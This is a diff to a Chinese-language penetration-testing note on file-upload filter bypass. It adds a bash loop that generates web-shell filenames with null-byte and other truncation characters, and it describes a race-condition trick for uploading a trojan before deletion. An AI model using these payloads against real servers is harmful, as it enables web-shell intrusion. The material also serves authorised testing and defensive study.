@@ -32,7 +32,14 @@ test.jsp.
 ```
 ### 截断
 ```
-filename.php%00.pdf
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps'; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
 ```
 ### 条件竞争绕过
 服务器对文件进行检测，如果不符合则删除文件，这其中需要一些时间，我们可以利用这个时间差进行上传木马，要求服务器接收到文件不会重命名。
